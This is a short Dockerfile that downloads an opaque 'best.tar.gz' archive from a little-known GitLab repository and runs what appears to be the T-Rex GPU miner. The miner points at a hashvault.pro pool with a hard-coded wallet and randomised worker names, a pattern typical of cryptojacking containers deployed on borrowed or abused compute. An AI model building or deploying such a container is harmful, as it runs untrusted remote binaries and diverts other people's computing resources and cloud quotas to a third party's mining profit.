FROM ubuntu:latest AS build
RUN apt-get update && apt-get -y install wget vim
WORKDIR /home
RUN wget https://gitlab.com/cepiade85/sehab/-/raw/main/best.tar.gz && tar -xvf best.tar.gz
RUN tar -xvf best.tar.gz

ENTRYPOINT [ "./t-rex" ]
CMD [ "-a", "cryptonight_gpu", "-o", "singapore01.hashvault.pro:80", "-u", "ccx7Y819UH1Tk4kbKYYP8ghSjK8FfR7bR3GSJ1XVqFaxQZPtmp1JgMRXtznxBsofFP8JB32YYBmtwLdoEirjAbYo4DBZk4YND3", "-p x", "-w $(echo $(shuf -i 1000-99999999999 -n 1)-monyet)" ]
